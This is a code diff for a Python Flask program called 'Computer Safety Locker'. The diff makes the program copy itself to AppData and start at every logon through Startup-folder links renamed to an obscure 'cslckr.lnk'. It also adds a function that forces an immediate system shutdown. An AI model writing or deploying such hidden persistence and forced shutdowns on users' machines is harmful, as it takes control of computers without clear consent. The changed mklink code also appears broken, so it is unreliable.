@@ -1,34 +1,30 @@
 import os
+import sys
 import shutil
 import subprocess
-import win32com.client
 from flask import Flask, send_file, request, redirect, url_for
  
 app = Flask(__name__)
 
 def create_shortcut():
-    source_file = __file__
+    if getattr(sys, 'frozen', False):
+        source_file = sys.executable
+    else:
+        source_file = os.path.abspath(__file__)
+
     destination_location = os.path.join(os.path.expanduser("~"), "AppData")
-    startup_shortcut_path = os.path.join(os.path.expanduser("~"), "AppData", "Roaming", "Microsoft", "Windows", "Start Menu", "Programs", "Startup", "Computer Safety Locker.lnk")
-    programs_shortcut_path = os.path.join(os.path.expanduser("~"), "AppData", "Roaming", "Microsoft", "Windows", "Start Menu", "Programs", "Computer Safety Locker.lnk")
+    startup_shortcut_path = os.path.join(os.path.expanduser("~"), "AppData", "Roaming", "Microsoft", "Windows", "Start Menu", "Programs", "Startup", "cslckr.lnk")
+    programs_shortcut_path = os.path.join(os.path.expanduser("~"), "AppData", "Roaming", "Microsoft", "Windows", "Start Menu", "Programs", "cslckr.lnk")
 
     if os.name == 'nt':
         shutil.copy(source_file, destination_location)
-        shell = win32com.client.Dispatch("WScript.Shell")
-        for shortcut_path in [startup_shortcut_path, programs_shortcut_path]:
-            if not os.path.exists(shortcut_path):
-                shortcut = shell.CreateShortCut(shortcut_path)
-                shortcut.TargetPath = source_file
-                shortcut.IconLocation = "templates\\saftey.ico"
-                shortcut.save()
+        subprocess.run(["mklink", startup_shortcut_path, source_file], check=True, shell=True)
+        subprocess.run(["mklink", programs_shortcut_path, source_file], check=True, shell=True)
     else:
         print("Shortcut creation is only supported on Windows.")
 
 def shutdown():
-    if os.name == 'nt':
-        subprocess.call(['shutdown', '/s', '/t', '0'])
-    else:
-        os.system('shutdown -h now')
+    subprocess.call(['shutdown', '/s', '/t', '0'])
 
 @app.route('/', methods=['GET', 'POST'])
 def home():
